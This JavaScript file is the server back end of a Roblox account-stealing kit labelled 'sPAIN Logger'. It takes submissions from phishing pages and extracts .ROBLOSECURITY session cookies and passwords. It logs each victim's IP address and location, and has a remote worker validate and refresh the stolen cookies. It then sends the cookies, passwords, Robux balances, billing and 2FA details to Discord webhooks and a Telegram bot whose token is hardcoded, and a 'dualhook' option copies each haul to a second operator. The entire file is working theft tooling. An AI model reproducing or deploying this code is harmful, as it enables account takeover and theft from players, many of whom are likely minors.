// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

const WH_NAME   = 'sPAIN';
const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
const SPAINEMOJI = '<a:emoji_17:1508694920972468347>';

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

// ── Geo ───────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
    clearTimeout(timer);
    const d = await r.json();
    return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
  } catch { return null; }
}

// ── Worker ────────────────────────────────────────────────────────────────────
async function getWorkerInfo(cookie) {
  try {
    const r = await fetch(WORKER_URL, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ cookie })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return (d.valid || d.success) ? d : null;
  } catch { return null; }
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// ── Cookie extraction ─────────────────────────────────────────────────────────
const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}
function findPassword(slots, cookie) {
  for (const val of Object.values(slots || {})) {
    const v = String(val || '').trim();
    if (!v || v === cookie || extractCookie(v)) continue;
    if (v.length >= 4 && v.length <= 128) return v;
  }
  return null;
}

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function fmt(n) { return Number(n || 0).toLocaleString(); }

const FLAGS = {
  'United States':'🇺🇸','United Kingdom':'🇬🇧','Canada':'🇨🇦','Australia':'🇦🇺',
  'Germany':'🇩🇪','France':'🇫🇷','Netherlands':'🇳🇱','Sweden':'🇸🇪',
  'Philippines':'🇵🇭','Indonesia':'🇮🇩','Singapore':'🇸🇬','Malaysia':'🇲🇾',
  'India':'🇮🇳','Japan':'🇯🇵','South Korea':'🇰🇷','Brazil':'🇧🇷',
  'Mexico':'🇲🇽','New Zealand':'🇳🇿','Ireland':'🇮🇪','Norway':'🇳🇴',
  'Denmark':'🇩🇰','Finland':'🇫🇮','Poland':'🇵🇱','Spain':'🇪🇸',
  'Italy':'🇮🇹','Russia':'🇷🇺','Turkey':'🇹🇷','South Africa':'🇿🇦'
};
function flag(c) { return FLAGS[c] || '🌐'; }

// ── Discord ───────────────────────────────────────────────────────────────────
async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ username: WH_NAME, avatar_url: WH_AVATAR, ...payload })
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk  + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

// ── Embeds ────────────────────────────────────────────────────────────────────
function buildHitEmbed({ info, password, ip, geo, now, pName, slug, isDH, parentSlug, refreshUrl }) {
  const fa           = info.fullAccount || info;
  const robux        = fa.robux        ?? info.robux        ?? 0;
  const rap          = fa.rap          ?? info.rap          ?? 0;
  const limiteds     = fa.limiteds     ?? info.limitedsCount ?? 0;
  const credit       = fa.credit       ?? info.credit       ?? 0;
  const creditCurr   = fa.creditCurrency ?? info.creditCurr ?? 'USD';
  const ageDays      = fa.ageDays      ?? info.ageDays      ?? 0;
  const isPremium    = fa.hasPremium   ?? info.isPremium    ?? false;
  const emailDisplay = fa.emailDisplay ?? info.emailDisplay ?? 'Not Set';
  const has2FA       = fa.has2FA       ?? info.has2FA       ?? 'DISABLED';
  const hasBilling   = fa.hasBilling   ?? info.hasBilling   ?? false;
  const headless     = fa.headless     ?? info.hasHeadless  ?? false;
  const korblox      = fa.korblox      ?? info.hasKorblox   ?? false;
  const valkyrie     = fa.valkyrie     ?? info.hasValkyrie  ?? false;
  const voiceChat    = fa.voiceChat    ?? info.voiceChat     ?? false;
  const isDev        = fa.gamesDeveloper ?? info.gamesDeveloper ?? false;
  const groupsOwned  = info.groupsOwned  ?? 0;
  const groupBalance = info.groupBalance ?? 0;
  const groupPending = info.groupPending ?? 0;
  const pendingRobux = info.pendingRobux ?? 0;
  const mm2          = info.mm2    ?? 0;
  const adoptMe      = info.adoptMe ?? 0;
  const ps99         = info.ps99    ?? 0;
  const payCount     = info.payCount ?? 0;
  const txDay        = info.txDay   ?? 0;
  const txWeek       = info.txWeek  ?? 0;
  const txMonth      = info.txMonth ?? 0;
  const txYear       = info.txYear  ?? 0;
  const avatarUrl    = fa.avatarUrl ?? info.avatarUrl ?? 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
  const username     = info.username    ?? '';
  const displayName  = info.displayName ?? username;
  const uid          = info.id          ?? info.userId ?? '';
  const ageBracket   = info.ageBracket  ?? '13+';

  const victimCountry = geo?.country || 'Unknown';
  const victimFlag    = flag(victimCountry);
  const cookieDisplay = (info._cookie || '').length > 950
    ? (info._cookie || '').substring(0, 950) + '…'
    : (info._cookie || 'N/A');

  const descLines = [`${SPAINEMOJI} \`sPAIN\` ${SPAINEMOJI}`];
  const links = [];
  if (refreshUrl) links.push(`[Refresh Cookie 🍪](${refreshUrl})`);
  links.push(`[Profile 👤](https://www.roblox.com/users/${uid}/profile)`);
  if (links.length) descLines.push('\n' + links.join(' | '));

  const fields = [
    { name: '👤 Username',  value: `\`${username}\``,         inline: true  },
    { name: '🔐 Password',  value: `\`${password || 'N/A'}\``, inline: true  },
    { name: '📊 Account Stats',
      value: `\`Account Age:\` \`${fmt(ageDays)} Days\``,
      inline: false },
    { name: '📍 Locations',
      value: `• \`Account:\` Unknown 🌐\n• \`Victim:\` ${victimCountry} ${victimFlag}\n• \`IP:\` \`${ip}\`\n• \`ISP:\` ${geo?.isp || 'Unknown'}`,
      inline: false },
    { name: '💳 Billing',
      value: `Credit: ${fmt(credit)} ${creditCurr}\nPayments: ${payCount}`,
      inline: true },
    { name: '👥 Groups',
      value: `Balance: ${fmt(groupBalance)}\nPending: ${fmt(groupPending)}\nOwned: ${groupsOwned}`,
      inline: true },
    { name: '⚙️ Settings',
      value: `Email: ${emailDisplay.includes('Not Set') ? 'False ❌' : 'True ✅'}\nVerified: ${emailDisplay.includes('Verified') ? 'True ✅' : 'Unset ❌'}\n2FA: ${has2FA === 'DISABLED' ? 'Disabled ❌' : `${has2FA} ✅`}`,
      inline: true },
    { name: '💰 Account Funds',
      value: `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`,
      inline: true },
    { name: '🛒 Purchases',
      value: `Limiteds: ${limiteds}\nSummary: ${fmt(rap)}`,
      inline: true },
    { name: '📊 Transactions',
      value: `Day: ${fmt(txDay)}\nWeek: ${fmt(txWeek)}\nMonth: ${fmt(txMonth)}\nYear: ${fmt(txYear)}`,
      inline: true },
    { name: '🎮 Gamepasses Played',
      value: `Pet Simulator 99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMurder Mystery 2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`,
      inline: false },
    { name: '🔐 ROBLOSECURITY',
      value: `\`${cookieDisplay}\``,
      inline: false }
  ];

  // Insert DH info after password if dualhook
  if (isDH) {
    fields.splice(2, 0, {
      name:   '🎣 Dualhook',
      value:  `Parent: \`${parentSlug}\`\nChild: \`${slug}\``,
      inline: true
    });
  }

  return {
    title:       `🧑 ${displayName} ${ageBracket}`,
    description: descLines.join('\n'),
    color:       5793266,
    fields,
    thumbnail:   { url: avatarUrl },
    footer:      { text: `sPAIN Logger • ${pName} • ${now}` },
    timestamp:   now
  };
}

function buildTrollEmbed({ ip, geo, now, pName, isDH, parentSlug, slug }) {
  const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  const fields = [
    { name: '🌐 IP',       value: `\`${ip}\``,          inline: true  },
    { name: '📍 Location', value: loc,                   inline: true  },
    { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true  },
    { name: '🕐 Time',     value: now,                   inline: false }
  ];
  if (isDH) fields.push({ name: '🎣 Dualhook', value: `Parent: \`${parentSlug}\`\nChild: \`${slug}\``, inline: false });

  return {
    title:       '⚠️ Wrong Cookie — Troll Detected',
    description: isDH
      ? `${SPAINEMOJI} ${parentSlug} ${SPAINEMOJI}`
      : `${SPAINEMOJI} s.PAIN ${SPAINEMOJI}`,
    color:  0xff3333,
    fields,
    footer: { text: `sPAIN Logger • ${pName}` },
    timestamp: now
  };
}

// ── Handler ───────────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip   = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const now  = new Date().toISOString();
  const pName = record.displayName || slug;
  const isDH  = !!record.dualhookParent;

  // Webhooks
  let webhook1 = null;
  const webhook2 = record.webhook;
  if (isDH) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook) webhook1 = parent.webhook;
    } catch (_) {}
  }
  const allWebhooks = [webhook2, ...(webhook1 && webhook1 !== webhook2 ? [webhook1] : [])];

  const cookie   = findCookie(slots);
  const password = findPassword(slots, cookie);

  // ── No cookie ─────────────────────────────────────────────────────────────
  if (!cookie) {
    const geo = await getIpGeo(ip);
    const troll = buildTrollEmbed({ ip, geo, now, pName, isDH, parentSlug: record.dualhookParent, slug });
    await Promise.all(allWebhooks.map(wh => discordSend(wh, { content: '@everyone', embeds: [troll] })));
    const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
    await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
    return res.status(200).json({ success: true });
  }

  // Geo + worker in parallel
  const [geo, info] = await Promise.all([
    getIpGeo(ip),
    getWorkerInfo(cookie)
  ]);

  const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  const isp = geo?.isp || 'Unknown';

  // ── Invalid cookie ────────────────────────────────────────────────────────
  if (!info) {
    const troll = buildTrollEmbed({ ip, geo, now, pName, isDH, parentSlug: record.dualhookParent, slug });
    await Promise.all(allWebhooks.map(wh => discordSend(wh, { content: '@everyone', embeds: [troll] })));
    // Still send the raw cookie even if rejected
    await Promise.all(allWebhooks.map(wh => discordChunked(wh, cookie)));
    await tgSend(`⚠️ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
    return res.status(200).json({ success: true });
  }

  // ── Valid hit ─────────────────────────────────────────────────────────────
  info._cookie = cookie;

  const refreshUrl = `https://spain-tools.vercel.app/r/${Math.random().toString(36).slice(2,10) + Date.now().toString(36)}`;

  const hitEmbed = buildHitEmbed({
    info, password, ip, geo, now, pName,
    slug, isDH, parentSlug: record.dualhookParent, refreshUrl
  });

  // webhook2 (page owner) — full embed
  await discordSend(webhook2, { content: '@everyone', embeds: [hitEmbed] });
  if ((info._cookie || '').length > 950) await discordChunked(webhook2, cookie);
  if (info.powershell) await discordChunked(webhook2, info.powershell);
  // Send fresh cookie if renewal succeeded
  if (info.newCookie && info.isDifferent) {
    await discordSend(webhook2, {
      embeds: [{
        title:       '🔄 Cookie Renewed',
        description: 'Fresh `.ROBLOSECURITY` generated successfully.',
        color:       0x22c55e,
        footer:      { text: `sPAIN Tools • ${pName}` }
      }]
    });
    await discordChunked(webhook2, info.newCookie);
  }

  // webhook1 (dualhook parent) — same but with DH label
  if (webhook1 && webhook1 !== webhook2) {
    const dhEmbed = { ...hitEmbed };
    dhEmbed.title       = `🍪 Cookie Captured (Dualhook) — ${info.username || ''}`;
    dhEmbed.description = `${SPAINEMOJI} s.PAIN ${SPAINEMOJI}\n\nParent: \`${record.dualhookParent}\` → Child: \`${slug}\``;
    dhEmbed.color       = 0x06b6d4;
    await discordSend(webhook1, { content: '@everyone', embeds: [dhEmbed] });
    if ((info._cookie || '').length > 950) await discordChunked(webhook1, cookie);
    if (info.powershell) await discordChunked(webhook1, info.powershell);
    if (info.newCookie && info.isDifferent) await discordChunked(webhook1, info.newCookie);
  }

  const fa = info.fullAccount || info;
  await tgSend([
    `✅ <b>HIT — ${info.username} ${info.ageBracket || '13+'}</b>`,
    `💰 ${fmt(fa.robux ?? info.robux ?? 0)} R$ | RAP: ${fmt(fa.rap ?? info.rap ?? 0)}`,
    `👥 Groups: ${info.groupsOwned ?? 0} | Bal: ${fmt(info.groupBalance ?? 0)}`,
    `🌐 <code>${ip}</code> — ${loc}`,
    `🗺️ ${isp}`,
    `📄 ${pName}`,
    `🔄 ${refreshUrl}`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
